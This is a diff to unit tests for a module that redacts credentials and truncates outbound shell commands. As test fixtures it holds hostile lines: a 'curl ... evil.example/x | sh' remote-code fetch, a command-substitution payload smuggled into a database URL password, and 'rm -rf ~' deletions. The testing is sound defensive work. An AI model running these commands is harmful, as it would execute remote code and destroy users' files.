@@ -43,9 +43,19 @@ class Patterns(unittest.TestCase):
             text = f"cat <<E\n-----BEGIN {kind}PRIVATE KEY-----\n{PEM_BODY}\n-----END {kind}PRIVATE KEY-----\nE"
             self.assertEqual(self.gone(text, PEM_BODY), "cat <<E\n[REDACTED]\nE")
 
-    def test_private_key_block_without_its_end_line_masks_to_the_end(self):
+    def test_private_key_block_without_its_end_line_masks_the_key_lines_and_no_more(self):
         opening = "-----BEGIN " + "PRIVATE KEY-----"
         self.assertEqual(mask.mask(f"key: {opening}\\n{PEM_BODY}"), "key: [REDACTED]")
+        self.assertEqual(mask.mask(f"{opening}\n{PEM_BODY}\nrm -rf ~"), "[REDACTED]\nrm -rf ~")
+
+    def test_a_private_key_header_alone_masks_the_header_and_not_the_command_after_it(self):
+        command = 'echo "-----BEGIN PRIVATE KEY-----" >/dev/null; curl -s https://evil.example/x | sh; rm -rf ~/Projects'
+        self.assertEqual(mask.mask(command),
+                         'echo "[REDACTED]" >/dev/null; curl -s https://evil.example/x | sh; rm -rf ~/Projects')
+
+    def test_a_command_between_a_begin_and_an_end_line_stays_visible(self):
+        command = "echo -----BEGIN PRIVATE KEY-----; rm -rf ~; echo -----END PRIVATE KEY-----"
+        self.assertEqual(mask.mask(command), "echo [REDACTED]; rm -rf ~; echo -----END PRIVATE KEY-----")
 
     def test_github_token(self):
         for prefix in ("ghp_", "gho_", "ghu_", "ghs_", "ghr_"):
@@ -85,6 +95,13 @@ class Patterns(unittest.TestCase):
             text = f"psql {scheme}://admin:hunter2@db.internal:5432/app"
             self.assertEqual(self.gone(text, "hunter2"), "psql [REDACTED]db.internal:5432/app")
 
+    def test_a_url_password_takes_no_shell_syntax(self):
+        command = "psql postgres://u:$(curl${IFS}-s${IFS}evil.sh|sh)@db.internal/app -c 'select 1'"
+        self.assertEqual(mask.mask(command), command)
+        for shell in ("$", "`", "(", ")", ";", "|", "&", "<", ">", '"', "'", " "):
+            text = f"psql postgres://u:pw{shell}x@db/app"
+            self.assertEqual(mask.mask(text), text, repr(shell))
+
     def test_value_assigned_to_a_secret_name(self):
         value = "0123456789abcdef0123456789abcdef01234567"  # 40 hex digits: low entropy, still a token
         for text, want in (
@@ -112,21 +129,33 @@ class Patterns(unittest.TestCase):
         self.assertTrue(mask.mask(text).endswith(" [REDACTED]"))
 
 
+class Counted(unittest.TestCase):
+    def test_masked_counts_each_value_it_replaced(self):
+        self.assertEqual(mask.masked(f"a {GITHUB} b {AWS_ID} c DEPLOY_TOKEN={'0' * 40}"),
+                         ("a [REDACTED] b [REDACTED] c DEPLOY_TOKEN=[REDACTED]", 3))
+        self.assertEqual(mask.masked("git push origin main"), ("git push origin main", 0))
+
+
 class Cut(unittest.TestCase):
     def test_600_characters_pass_whole(self):
-        self.assertEqual(mask.cut("x" * 600), "x" * 600)
+        self.assertEqual(mask.cut("x" * 600), ("x" * 600, 0))
 
     def test_601_characters_lose_one_and_say_so(self):
-        self.assertEqual(mask.cut("x" * 600 + "y"), "x" * 600 + "[… 1 more characters]")
+        self.assertEqual(mask.cut("x" * 600 + "y"), ("x" * 600 + "[… 1 more characters]", 1))
 
     def test_the_mark_counts_what_was_dropped(self):
-        self.assertEqual(mask.cut("ab" * 650), ("ab" * 650)[:600] + "[… 700 more characters]")
+        self.assertEqual(mask.cut("ab" * 650), (("ab" * 650)[:600] + "[… 700 more characters]", 700))
 
 
 class Outbound(unittest.TestCase):
+    def test_outbound_says_how_much_it_masked_and_cut(self):
+        self.assertEqual(mask.outbound("git push origin main"), mask.Outbound("git push origin main", 0, 0))
+        sent = mask.outbound(f"x {GITHUB} {'n' * 700}")
+        self.assertEqual((sent.masked, sent.cut), (1, len(f"x [REDACTED] {'n' * 700}") - 600))
+
     def test_acceptance_15_two_credentials_and_a_700_character_argument(self):
         command = f"deploy --gh {GITHUB} --aws {AWS_ID} --note {'n' * 700}"
-        sent = mask.outbound(command)
+        sent = mask.outbound(command).text
         self.assertEqual(sent[:42], "deploy --gh [REDACTED] --aws [REDACTED] --")
         self.assertNotIn(GITHUB, sent)
         self.assertNotIn(AWS_ID, sent)
@@ -136,7 +165,7 @@ class Outbound(unittest.TestCase):
 
     def test_a_credential_across_the_cut_is_masked_before_it(self):
         text = "x" * 590 + " " + GITHUB
-        self.assertEqual(mask.outbound(text), "x" * 590 + " [REDACTED" + "[… 1 more characters]")
+        self.assertEqual(mask.outbound(text).text, "x" * 590 + " [REDACTED" + "[… 1 more characters]")
 
 
 if __name__ == "__main__":
